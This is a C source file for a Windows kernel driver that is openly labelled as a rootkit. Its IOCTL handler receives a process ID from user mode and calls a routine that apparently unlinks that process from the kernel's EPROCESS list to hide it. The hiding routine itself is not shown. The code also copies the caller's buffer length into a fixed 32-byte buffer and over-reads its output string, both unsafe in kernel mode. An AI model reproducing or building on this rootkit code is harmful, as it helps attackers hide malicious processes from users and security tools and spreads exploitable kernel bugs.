#include "driver.h"


// IRP code that will call our EPROCESS de-link functionality
#define IRP_ROOTKIT_CODE 0x815



// Default IRP dispatcher, passthrough no action, return STATUS_SUCCESS
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// Set status as success
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	// Complete request
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

// Handler to recieve IRP request and call Rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufferLength, outBufferLength, requestcode;


	// Recieve the IRP stack location from system
	irpSp = IoGetCurrentIrpStackLocation(Irp);

	// Recieve the buffer lengths, and request code
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;
	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
	PCHAR buffer = NULL;

	PCHAR               data = "This String is from Device Driver !!!";
	size_t datalen = strlen(data) + 1;//Length of data including null

	// Check the request code
	switch (requestcode) {

	case IRP_ROOTKIT_CODE:
	{
		
		Irp->IoStatus.Information = inBufferLength;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", inBuf));

		// Allocate memory for the PID
		char pid[32];


		// Copy the input buffer into PID
		strcpy_s(pid, inBufferLength, inBuf);


		/* Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
		KIRQL irql;
		PKDPC dpcPtr;
		irql = RaiseIRQL();
		dpcPtr = AquireLock();  */


		//
		// To access the output buffer, just get the system address
		// for the buffer. For this method, this buffer is intended for transfering data
		// from the driver to the application.
		//

		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);

		if (!buffer) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		

		// Call our rootkit functionality
		// modifyTaskList in hideprocess.c
		data = modifyTaskList(atoi(pid));

		//
		// Write data to be sent to the user in this buffer
		//

		RtlCopyBytes(buffer, data, outBufferLength);


		Irp->IoStatus.Information = (outBufferLength<datalen ? outBufferLength : datalen);

		/* Release access to the EPROCESS list and exit
		ReleaseLock(dpcPtr);
		LowerIRQL(irql); */

		break;
	}
	default:
	{
		// Set invalid request
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}
	}


	// Set status 
	Irp->IoStatus.Status = status;

	// Complete request
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}